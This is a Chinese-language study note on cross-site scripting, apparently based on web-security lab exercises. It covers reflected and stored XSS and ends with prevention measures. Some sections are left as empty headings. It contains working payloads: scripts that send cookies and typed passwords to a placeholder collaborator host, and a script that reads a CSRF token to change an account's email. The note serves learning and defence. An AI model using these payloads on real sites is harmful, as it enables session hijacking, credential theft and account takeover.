# XSS 跨站脚本攻击

通过注入恶意的`js`代码，当用户浏览到存在该恶意代码的页面时，恶意代码会被执行

## XSS攻击类型
### Reflect XSS 反射型
简单来说，攻击者直接将含有恶意`js`代码的链接发给受害者，当受害者点开此链接时会发出`HTTP Request`，而恶意代码会通过`HTTP Response`返回给用户，
这样恶意代码就会在受害者的浏览器上执行，起到攻击的效果

这种进攻不会造成特别严重的后果，因为其无法对数据进行任何的处理

当碰到一些可以允许用户进行输入的输入框并且输入后能够返回查询结果时，可以输入
```javascript
<script>alert("xxx")</script>
```
#### Reflect XSS能够干什么
* 用户能在应用里操作什么，`Reflect XSS`就能干什么
* 用户能看什么，`Reflect XSS`就能看什么
* 用户能修改什么，`Reflect XSS`就能修改什么
#### 不同情况下的Reflect XSS
`Reflect XSS`很简单，但问题是往`HTTP Response`哪里放




如果出现警告框，说明此处一定有`XSS`漏洞
### Stored XSS 存储型
恶意代码被存储到服务器中，当用户访问到恶意代码存在的网页上时，恶意代码被执行，破坏性更强，隐蔽性更强

比如说，在网页当中的留言板，留言所有用户都可以看到
```http request
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```
当用户浏览此留言时，可以看到
```html
<p>This post was extremely helpful.</p>
```
如果攻击者在留言版上输入
```javascript
<script>/* Bad stuff here... */</script>
```
当其他用户访问时，能够看到一个警告框

`Stored XSS`通常在留言板这种其他用户能够访问到，并且发布的内容会被数据库存储的地方

#### 盗取cookie
如果发现了`XSS`漏洞则，首先插入

```javascript
<script>alert(document.cookie)</script>
```
使用`burp suite`里面的`burp collaborator client`点击`copy to clipboard`生成一个随即域名

在留言区域插入，并点击发送,https://beeceptor.com/也可以
```javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
在`burp collaborator client`中点击`poll now`，找到`session`信息，成功盗取

#### 盗取用户密码
将代码嵌入到留言板中
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
#### 通过XSS发起CSRF攻击
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

### DOM-based XSS DOM型



## XSS攻击的危害

## 预防XSS攻击的方法
* `cookie`设置`httpOnly`，这样`javascript`代码就无法读取`cookie`，这样就偷不到了
* 输入检测，检测用户输入的是否含有特殊字符，并对其进行转义或者拒绝恶意输入
* 输出检测，检查最终返回给用户的页面是否包含恶意的`js`代码
* Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
* Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
* Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
* Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

## XSS攻击流程总结